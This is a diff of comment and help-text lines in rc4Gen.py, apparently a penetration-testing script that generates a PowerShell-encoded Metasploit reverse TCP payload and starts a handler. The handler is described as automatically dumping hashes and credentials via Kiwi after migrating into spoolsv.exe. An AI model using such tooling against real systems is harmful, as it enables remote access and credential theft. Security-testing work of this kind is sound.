@@ -1,7 +1,11 @@
 #!/usr/bin/python
 # Description: Generates a MSF Reverse TCP RC4 payload encoded in Powershell to the clipboard.
-# Created by: Nick Sanzotta / @beamr
+# Automatically launches the corresponding MSF Multi/Handler.
+# The Multi/Handler listener is weaponized to automatically migrate into the spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.
+# rc4Gen.py supports both command-line parameters and a Wizard driven menu.
 # Version: rc4Gen.py v 1.0
+# Created by: Nick Sanzotta/@beamr
+
 import getopt, os, sys, pyperclip, socket
 import urllib, json
 from sys import argv
@@ -107,7 +111,7 @@ def help():
         print " Example: python rc4Gen.py --lhost 10.0.0.1 --lport=445 --pass=Password123 --verbose=on --listener=off"
         
         print colors.green + "\n Tips:\n" + colors.normal
-        print " If LHOST is not defined the Wizard menu will be launched.\n"
+        print " If LHOST is not defined the Wizard menu will be launched."
         print " The Multi/Handler listener is weaponized to automatically migrate into the\
                 \n spoolsv.exe process, load Kiwi, run sysinfo, hashdump, creds_all and lsa_dump.\n"
 
